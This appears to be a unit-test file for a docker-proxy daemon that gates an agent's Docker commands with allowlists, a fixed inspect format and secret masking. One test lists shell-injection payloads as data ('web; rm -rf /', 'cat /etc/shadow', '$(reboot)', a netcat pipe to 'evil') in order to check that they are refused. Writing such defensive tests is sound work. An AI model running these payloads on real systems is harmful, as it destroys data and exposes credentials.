"""Unit tests for docker-proxy. No real Docker and no network: every docker invocation goes through a fake
`run` recorder instead of subprocess.run (same technique as the rest of this repo's hook tests: replace the one
side-effecting call with a fake, assert on what it would have run). The end-to-end test below opens a real Unix
socket on a local tmp path, which is not network access.
"""
import json, os, shutil, socket, subprocess, sys, tempfile, threading, unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import docker_proxyd as dp
import docker_proxy_client as dpc

REPO_ROOT = os.path.dirname(HERE)
REAL_MASK = os.path.join(REPO_ROOT, "secret-guard", "mask")


class FakeRun:
    """Stand-in for subprocess.run: records every argv it was called with instead of running anything."""

    def __init__(self, returncode=0, stdout="ok\n", stderr=""):
        self.calls = []
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr

    def __call__(self, argv, **kwargs):
        self.calls.append(argv)
        return subprocess.CompletedProcess(argv, self.returncode, self.stdout, self.stderr)


def cfg(containers=(), read_allow=None):
    """read_allow=None means unconfigured (every syntactically valid target readable, the pre-existing
    behaviour); pass an iterable (possibly empty) to mean read_allow.containers is configured to exactly that."""
    return {
        "write_allow_containers": set(containers),
        "read_allow_containers": None if read_allow is None else set(read_allow),
    }


def inspect_stdout(**fields):
    """Build the exact text `docker inspect --format INSPECT_FORMAT` would print for the given field values --
    one JSON value per line, in dp.INSPECT_FIELDS order, trailing newline included (as docker itself appends
    one). Fields not passed default to a harmless placeholder, since build_inspect_result() only cares about
    position and valid JSON, not content, for fields a given test doesn't exercise."""
    defaults = {"Name": "/web", "Id": "abc123", "State": "running", "Image": "nginx:1",
                "RestartPolicy": {"Name": "always"}, "Health": None, "Networks": {}, "Mounts": []}
    defaults.update(fields)
    return "\n".join(json.dumps(defaults[key]) for key, _path in dp.INSPECT_FIELDS) + "\n"


class ReadAlwaysAllowed(unittest.TestCase):
    def test_ps(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps"}, cfg())
        self.assertTrue(allowed)
        self.assertEqual(argv, ["docker", "ps"])

    def test_ps_all_flag(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps", "all": True}, cfg())
        self.assertEqual(argv, ["docker", "ps", "-a"])

    def test_ps_rejects_target(self):
        allowed, reason, argv = dp.decide({"subcommand": "ps", "target": "x"}, cfg())
        self.assertFalse(allowed)

    def test_logs_inspect_stats_top_on_empty_allowlist(self):
        # Reads never consult write_allow_containers at all -- they are allowed on a container the config knows
        # nothing about, because read access is unconditional, not whitelist-gated.
        for sub in ("logs", "inspect", "stats", "top"):
            allowed, reason, argv = dp.decide({"subcommand": sub, "target": "anything-not-listed"}, cfg())
            self.assertTrue(allowed, f"{sub} should be allowed regardless of the write allowlist")
            self.assertIn("anything-not-listed", argv)

    def test_stats_always_gets_no_stream(self):
        _, _, argv = dp.decide({"subcommand": "stats", "target": "web"}, cfg())
        self.assertIn("--no-stream", argv)

    def test_logs_tail_bounds(self):
        allowed, _, argv = dp.decide({"subcommand": "logs", "target": "web", "tail": 50}, cfg())
        self.assertTrue(allowed)
        self.assertIn("--tail", argv)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": -1}, cfg())
        self.assertFalse(allowed)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": dp.MAX_TAIL + 1}, cfg())
        self.assertFalse(allowed)
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web", "tail": True}, cfg())
        self.assertFalse(allowed, "bool must not be accepted where an int is expected")


class WriteGatedByAllowlist(unittest.TestCase):
    def test_restart_on_whitelisted_container_allowed(self):
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "web"}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertEqual(argv, ["docker", "restart", "web"])

    def test_restart_on_non_whitelisted_container_refused(self):
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "db"}, cfg(["web"]))
        self.assertFalse(allowed)
        self.assertIsNone(argv)
        self.assertIn("not in write allowlist", reason)

    def test_start_and_stop_also_gated(self):
        for sub in ("start", "stop"):
            allowed, _, _ = dp.decide({"subcommand": sub, "target": "db"}, cfg(["web"]))
            self.assertFalse(allowed)
            allowed, _, _ = dp.decide({"subcommand": sub, "target": "web"}, cfg(["web"]))
            self.assertTrue(allowed)

    def test_stop_timeout_bounds(self):
        allowed, _, argv = dp.decide({"subcommand": "stop", "target": "web", "timeout": 5}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertIn("-t", argv)
        allowed, _, _ = dp.decide({"subcommand": "stop", "target": "web", "timeout": 99999}, cfg(["web"]))
        self.assertFalse(allowed)

    def test_start_has_no_timeout_option(self):
        # start's parser (client side) has no --timeout; server-side decide() also ignores it for "start" --
        # a timeout key there is simply not consulted, not an error, which is fine since write-start never builds -t.
        allowed, _, argv = dp.decide({"subcommand": "start", "target": "web", "timeout": 5}, cfg(["web"]))
        self.assertTrue(allowed)
        self.assertNotIn("-t", argv)


class UnknownSubcommandRefused(unittest.TestCase):
    def test_unknown(self):
        for sub in ("exec", "run", "rm", "create", "compose", "", None, "PS"):
            allowed, reason, argv = dp.decide({"subcommand": sub, "target": "web"}, cfg(["web"]))
            self.assertFalse(allowed, f"{sub!r} must be refused")
            self.assertIsNone(argv)

    def test_non_dict_request(self):
        allowed, reason, argv = dp.decide("not-a-dict", cfg())
        self.assertFalse(allowed)


class WildcardAndInjectionRefused(unittest.TestCase):
    def test_wildcard_target_refused_for_read(self):
        for bad in ("*", "web*", "?web", "web?", "[web]", "web db", ""):
            allowed, reason, argv = dp.decide({"subcommand": "logs", "target": bad}, cfg())
            self.assertFalse(allowed, f"{bad!r} must be refused")

    def test_wildcard_target_refused_for_write_even_if_listed_literally(self):
        # The literal string "*" itself could in principle be "whitelisted"; NAME_RE must still refuse it before
        # the whitelist check is ever consulted.
        allowed, reason, argv = dp.decide({"subcommand": "restart", "target": "*"}, cfg(["*"]))
        self.assertFalse(allowed)

    def test_shell_metacharacter_injection_in_target_refused(self):
        payloads = [
            "web; rm -rf /",
            "web && cat /etc/shadow",
            "web`id`",
            "$(reboot)",
            "web|nc evil 1234",
            "web\nrm -rf /",
            "../../etc/passwd",
            "-v",                      # flag-injection attempt: looks like a docker option, not a name
            "--privileged",
        ]
        for bad in payloads:
            allowed, reason, argv = dp.decide({"subcommand": "restart", "target": bad}, cfg([bad]))
            self.assertFalse(allowed, f"{bad!r} must be refused even if present in the allowlist")
            allowed, reason, argv = dp.decide({"subcommand": "logs", "target": bad}, cfg())
            self.assertFalse(allowed, f"{bad!r} must be refused for reads too")


class ReadAllowlistGating(unittest.TestCase):
    """read_allow.containers, when configured, narrows logs/inspect/stats/top to a literal allowlist, the same
    way write_allow.containers already gates restart/start/stop. Unconfigured (cfg()'s default), behaviour is
    unchanged: any syntactically valid target."""

    def test_unconfigured_read_allow_keeps_reads_unrestricted(self):
        for sub in ("logs", "inspect", "stats", "top"):
            allowed, _, _ = dp.decide({"subcommand": sub, "target": "anything-not-listed"}, cfg(read_allow=None))
            self.assertTrue(allowed, f"{sub} must stay unrestricted when read_allow is not configured")

    def test_configured_read_allow_refuses_unlisted_target(self):
        for sub in ("logs", "inspect", "stats", "top"):
            allowed, reason, argv = dp.decide({"subcommand": sub, "target": "db"}, cfg(read_allow=["web"]))
            self.assertFalse(allowed, f"{sub} on an unlisted target must be refused once read_allow is configured")
            self.assertIn("read allowlist", reason)

    def test_configured_read_allow_allows_listed_target(self):
        for sub in ("logs", "inspect", "stats", "top"):
            allowed, _, argv = dp.decide({"subcommand": sub, "target": "web"}, cfg(read_allow=["web"]))
            self.assertTrue(allowed, f"{sub} on a listed target must still be allowed")

    def test_empty_read_allow_refuses_everything_fail_closed(self):
        # An explicit, empty read_allow.containers is "restrict to nothing," not "unrestricted" -- same posture
        # as write_allow's own missing-section-defaults-to-empty.
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "web"}, cfg(read_allow=[]))
        self.assertFalse(allowed)

    def test_ps_is_not_gated_by_read_allow(self):
        # ps lists every container; it has no single target for read_allow to check against.
        allowed, _, _ = dp.decide({"subcommand": "ps"}, cfg(read_allow=["web"]))
        self.assertTrue(allowed)

    def test_write_allowlist_and_read_allowlist_are_independent(self):
        allowed, _, _ = dp.decide({"subcommand": "logs", "target": "db"}, cfg(containers=["web"], read_allow=None))
        self.assertTrue(allowed, "write_allow must never gate a read")


class InspectFixedFormat(unittest.TestCase):
    """inspect never takes a --format (or any other option) from the agent, and the one the daemon itself always
    uses never asks docker for Config.Env, Config.Cmd or Config.Entrypoint."""

    def test_format_key_from_agent_is_refused(self):
        allowed, reason, argv = dp.decide({"subcommand": "inspect", "target": "web", "format": "{{json .}}"}, cfg())
        self.assertFalse(allowed)
        self.assertIsNone(argv)
        self.assertIn("format", reason)

    def test_inspect_argv_carries_the_daemons_own_fixed_format(self):
        allowed, _, argv = dp.decide({"subcommand": "inspect", "target": "web"}, cfg())
        self.assertTrue(allowed)
        self.assertEqual(argv, ["docker", "inspect", "--format", dp.INSPECT_FORMAT, "web"])

    def test_fixed_format_never_requests_env_or_cmd(self):
        lowered = dp.INSPECT_FORMAT.lower()
        for secret_field in (".config.env", ".config.cmd", ".config.entrypoint"):
            self.assertNotIn(secret_field, lowered, f"INSPECT_FORMAT must never ask docker for {secret_field}")


class ReadAllowConfigLoading(unittest.TestCase):
    def _write(self, data):
        fd, path = tempfile.mkstemp(suffix=".json")
        with os.fdopen(fd, "w") as f:
            json.dump(data, f)
        self.addCleanup(os.remove, path)
        return path

    def test_no_read_allow_key_means_unconfigured(self):
        path = self._write({"write_allow": {"containers": ["web"]}})
        config = dp.load_config(path)
        self.assertIsNone(config["read_allow_containers"])

    def test_read_allow_with_containers_is_configured(self):
        path = self._write({"read_allow": {"containers": ["web", "worker-1"]}})
        config = dp.load_config(path)
        self.assertEqual(config["read_allow_containers"], {"web", "worker-1"})

    def test_read_allow_present_but_empty_is_configured_to_nothing(self):
        path = self._write({"read_allow": {}})
        config = dp.load_config(path)
        self.assertEqual(config["read_allow_containers"], set())

    def test_wildcard_in_read_allow_refused(self):
        for bad in ["*", "web*", "web?", "[a-z]+", ".*", "web db"]:
            path = self._write({"read_allow": {"containers": ["web", bad]}})
            with self.assertRaises(ValueError, msg=f"{bad!r} should make load_config refuse to start"):
                dp.load_config(path)

    def test_non_string_entry_in_read_allow_refused(self):
        path = self._write({"read_allow": {"containers": ["web", 123]}})
        with self.assertRaises(ValueError):
            dp.load_config(path)

    def test_non_list_read_allow_refused(self):
        path = self._write({"read_allow": {"containers": "web"}})
        with self.assertRaises(ValueError):
            dp.load_config(path)


class ClientNeverOffersFormat(unittest.TestCase):
    """The client's own argparse never exposes a --format (or any option beyond target/--tail/--timeout/-a) in
    the first place -- decide()'s own refusal (InspectFixedFormat above) is the real guard, this just locks down
    that the shipped client can't even construct such a request by accident."""

    def test_inspect_subparser_has_no_format_option(self):
        with self.assertRaises(SystemExit):
            dpc.build_parser().parse_args(["inspect", "web", "--format", "{{json .}}"])


class ConfigLoading(unittest.TestCase):
    def _write(self, data):
        fd, path = tempfile.mkstemp(suffix=".json")
        with os.fdopen(fd, "w") as f:
            json.dump(data, f)
        self.addCleanup(os.remove, path)
        return path

    def test_valid_config_loads(self):
        path = self._write({"write_allow": {"containers": ["web", "worker-1"]}})
        config = dp.load_config(path)
        self.assertEqual(config["write_allow_containers"], {"web", "worker-1"})

    def test_missing_section_defaults_to_empty(self):
        path = self._write({})
        config = dp.load_config(path)
        self.assertEqual(config["write_allow_containers"], set())

    def test_wildcard_in_config_refused(self):
        for bad in ["*", "web*", "web?", "[a-z]+", ".*", "web db"]:
            path = self._write({"write_allow": {"containers": ["web", bad]}})
            with self.assertRaises(ValueError, msg=f"{bad!r} should make load_config refuse to start"):
                dp.load_config(path)

    def test_non_string_entry_refused(self):
        path = self._write({"write_allow": {"containers": ["web", 123]}})
        with self.assertRaises(ValueError):
            dp.load_config(path)

    def test_non_list_refused(self):
        path = self._write({"write_allow": {"containers": "web"}})
        with self.assertRaises(ValueError):
            dp.load_config(path)


class HandleRequestUsesInjectedRun(unittest.TestCase):
    def test_allowed_write_calls_run_with_exact_argv(self):
        run = FakeRun(returncode=0, stdout="restarted\n")
        resp = dp.handle_request({"subcommand": "restart", "target": "web"}, cfg(["web"]), run=run)
        self.assertTrue(resp["ok"])
        self.assertEqual(run.calls, [["docker", "restart", "web"]])
        self.assertEqual(resp["stdout"], "restarted\n")

    def test_refused_request_never_calls_run(self):
        run = FakeRun()
        resp = dp.handle_request({"subcommand": "restart", "target": "db"}, cfg(["web"]), run=run)
        self.assertFalse(resp["ok"])
        self.assertEqual(run.calls, [], "a refused request must never reach subprocess")

    def test_docker_failure_is_surfaced_not_raised(self):
        run = FakeRun(returncode=1, stdout="", stderr="no such container\n")
        resp = dp.handle_request({"subcommand": "logs", "target": "ghost"}, cfg(), run=run)
        self.assertTrue(resp["ok"])          # the proxy allowed the call; docker itself failed
        self.assertEqual(resp["returncode"], 1)


class MutationGuardIsLoadBearing(unittest.TestCase):
    """If is_whitelisted() is disabled (reverted to "allow everything"), a write on a non-whitelisted container
    must flip from refused to allowed. If this test fails after such a change, the real guard was not doing
    anything -- which is exactly what it's meant to catch."""

    def test_disabling_the_whitelist_check_changes_the_outcome(self):
        req = {"subcommand": "restart", "target": "not-listed"}
        config = cfg(["web"])

        allowed_before, _, _ = dp.decide(req, config)
        self.assertFalse(allowed_before, "sanity check: the real guard must refuse this today")

        original = dp.is_whitelisted
        dp.is_whitelisted = lambda target, config: True
        try:
            allowed_after, _, _ = dp.decide(req, config)
        finally:
            dp.is_whitelisted = original

        self.assertTrue(
            allowed_after,
            "mutating is_whitelisted() to always allow had no effect -- decide() is not actually calling it",
        )


class SecretMasking(unittest.TestCase):
    """A fake container whose logs/environment carry a fake secret must never hand that secret back through
    `inspect` or `logs` -- both layers (the fixed field whitelist for inspect, mask_text() for both) apply before
    handle_request() returns anything to the caller."""

    FAKE_SECRET = "hunter2verysecretvalue"

    def test_logs_with_a_leaked_secret_are_masked(self):
        run = FakeRun(returncode=0, stdout=f"starting\nDATABASE_PASSWORD={self.FAKE_SECRET}\nready\n", stderr="")
        resp = dp.handle_request({"subcommand": "logs", "target": "web"}, cfg(), run=run)
        self.assertTrue(resp["ok"])
        self.assertNotIn(self.FAKE_SECRET, resp["stdout"])
        self.assertIn("<m>", resp["stdout"])
        self.assertIn("starting", resp["stdout"])      # the rest of the log is left alone

    def test_logs_stderr_is_masked_too(self):
        run = FakeRun(returncode=0, stdout="", stderr=f"warning: token={self.FAKE_SECRET}\n")
        resp = dp.handle_request({"subcommand": "logs", "target": "web"}, cfg(), run=run)
        self.assertNotIn(self.FAKE_SECRET, resp["stderr"])

    def test_inspect_never_exposes_env_because_it_is_never_requested(self):
        # The fixed --format never asks docker for Config.Env in the first place (see InspectFixedFormat), so
        # there is structurally no field in the daemon's own response that could carry it, however the real
        # container's environment looks. This fakes what the *filtered* docker call returns -- a fake secret
        # cannot even be expressed here, which is the point.
        run = FakeRun(returncode=0, stdout=inspect_stdout(Name="/web"), stderr="")
        resp = dp.handle_request({"subcommand": "inspect", "target": "web"}, cfg(), run=run)
        self.assertTrue(resp["ok"])
        result = json.loads(resp["stdout"])
        self.assertEqual(set(result), {key for key, _path in dp.INSPECT_FIELDS})
        self.assertNotIn("Env", result)
        self.assertNotIn("Cmd", result)

    def test_inspect_masks_a_secret_leaking_through_an_allowed_field(self):
        # Defense in depth: Health is whitelisted (it is operationally useful), but a health-check script can
        # print anything, including a secret, to its own output -- mask_text() must still catch it there.
        health = {"Status": "unhealthy", "Log": [{"Output": f"curl failed: token={self.FAKE_SECRET}\n"}]}
        run = FakeRun(returncode=0, stdout=inspect_stdout(Health=health), stderr="")
        resp = dp.handle_request({"subcommand": "inspect", "target": "web"}, cfg(), run=run)
        self.assertNotIn(self.FAKE_SECRET, resp["stdout"])

    def test_failed_inspect_is_surfaced_masked_not_as_a_hard_error(self):
        run = FakeRun(returncode=1, stdout="", stderr="Error: No such object: ghost\n")
        resp = dp.handle_request({"subcommand": "inspect", "target": "ghost"}, cfg(), run=run)
        self.assertTrue(resp["ok"])
        self.assertEqual(resp["returncode"], 1)

    def test_other_read_subcommands_are_not_touched_by_masking(self):
        # Out of scope for this fix (not asked for): ps/stats/top pass through exactly as before.
        run = FakeRun(returncode=0, stdout="CONTAINER ID   IMAGE\n", stderr="")
        resp = dp.handle_request({"subcommand": "ps"}, cfg(), run=run)
        self.assertEqual(resp["stdout"], "CONTAINER ID   IMAGE\n")


class MaskAndFormatMutationGuards(unittest.TestCase):
    """If mask_text() or the inspect field whitelist is disabled, a fake secret must flip from hidden to exposed.
    Same technique as MutationGuardIsLoadBearing above: prove the guard is load-bearing, not dead code."""

    FAKE_SECRET = "hunter2verysecretvalue"

    def test_disabling_mask_text_lets_the_secret_through(self):
        run = FakeRun(returncode=0, stdout=f"token={self.FAKE_SECRET}\n", stderr="")

        resp_before = dp.handle_request({"subcommand": "logs", "target": "web"}, cfg(), run=run)
        self.assertNotIn(self.FAKE_SECRET, resp_before["stdout"], "sanity check: masking must hide it today")

        original = dp.mask_text
        dp.mask_text = lambda text: text
        try:
            resp_after = dp.handle_request({"subcommand": "logs", "target": "web"}, cfg(), run=run)
        finally:
            dp.mask_text = original

        self.assertIn(
            self.FAKE_SECRET, resp_after["stdout"],
            "disabling mask_text() had no effect -- handle_request() is not actually calling it",
        )

    def test_passing_through_raw_inspect_output_lets_env_through(self):
        # Simulates what would happen if build_inspect_result() stopped filtering and just returned docker's raw
        # JSON (the exact regression this fix closes). inspect_stdout()'s fixed format cannot itself carry
        # Config.Env -- that is the whole point of layer 1 -- so this fixture stands in for "whatever docker
        # inspect would have printed before this fix," fed through the mutated code path. The fake secret is a
        # bare array element, not a "key=value" pair, so mask_text()'s own patterns (layer 2) do not happen to
        # catch it either -- this isolates what the field whitelist alone is responsible for.
        raw_with_env = json.dumps({"Name": "/web", "Config": {"Env": [self.FAKE_SECRET]}})
        run = FakeRun(returncode=0, stdout=inspect_stdout(), stderr="")

        original = dp.build_inspect_result
        dp.build_inspect_result = lambda stdout: {"raw": raw_with_env}
        try:
            resp_after = dp.handle_request({"subcommand": "inspect", "target": "web"}, cfg(), run=run)
        finally:
            dp.build_inspect_result = original

        self.assertIn(
            self.FAKE_SECRET, resp_after["stdout"],
            "bypassing build_inspect_result()'s field whitelist had no effect on the response",
        )


@unittest.skipUnless(shutil.which("perl") and os.access(REAL_MASK, os.X_OK), "perl or secret-guard/mask unavailable")
class MaskPortMatchesSecretGuard(unittest.TestCase):
    """mask_text() is a port of secret-guard/mask's own regexes (see its docstring for why a port and not a
    subprocess call to the Perl script). This pins the two together: a change to one not mirrored in the other
    shows up here as a mismatch, instead of silently drifting apart."""

    FIXTURES = [
        "token=abcdef1234567890\n",
        "Authorization: Bearer abc.def.ghijklmnop\n",
        "API_KEY: 'sk-ant-abcdefghij1234567890'\n",
        "postgres://user:hunter2pass@db:5432/app\n",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
        "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U\n",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAK...\n-----END RSA PRIVATE KEY-----\n",
        "plain line with nothing secret\n",
        "DATABASE_PASSWORD=hunter2verysecret\n",
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789\n",
        "X-Api-Key: abcdef1234567890\n",
        "curl -u admin:hunter2secret https://x\n",
        "--token mysecrettoken1234\n",
    ]

    def test_python_port_matches_perl_mask(self):
        for fixture in self.FIXTURES:
            proc = subprocess.run([REAL_MASK], input=fixture, capture_output=True, text=True, timeout=5)
            self.assertEqual(dp.mask_text(fixture), proc.stdout, f"mismatch on {fixture!r}")


class EndToEndOverRealSocket(unittest.TestCase):
    """Real Unix domain socket on a local tmp path (not network), real ProxyServer, fake docker run."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.sock_path = os.path.join(self.tmpdir, "docker-proxy.sock")
        self.run = FakeRun(returncode=0, stdout="hi\n")
        self.server = dp.ProxyServer(self.sock_path, cfg(["web"]), run=self.run)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.addCleanup(self._shutdown)

    def _shutdown(self):
        self.server.shutdown()
        self.server.server_close()

    def _ask(self, req):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(self.sock_path)
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        s.close()
        return json.loads(buf)

    def test_allowed_write_round_trips(self):
        resp = self._ask({"subcommand": "restart", "target": "web"})
        self.assertTrue(resp["ok"])
        self.assertEqual(self.run.calls, [["docker", "restart", "web"]])

    def test_refused_write_round_trips(self):
        resp = self._ask({"subcommand": "restart", "target": "db"})
        self.assertFalse(resp["ok"])
        self.assertEqual(self.run.calls, [])

    def test_malformed_json_is_refused_not_crashing(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(self.sock_path)
        s.sendall(b"{not json\n")
        buf = s.recv(65536)
        s.close()
        resp = json.loads(buf)
        self.assertFalse(resp["ok"])

    def test_socket_permissions_are_not_world_writable(self):
        mode = os.stat(self.sock_path).st_mode & 0o777
        self.assertEqual(mode, 0o660)


if __name__ == "__main__":
    unittest.main()
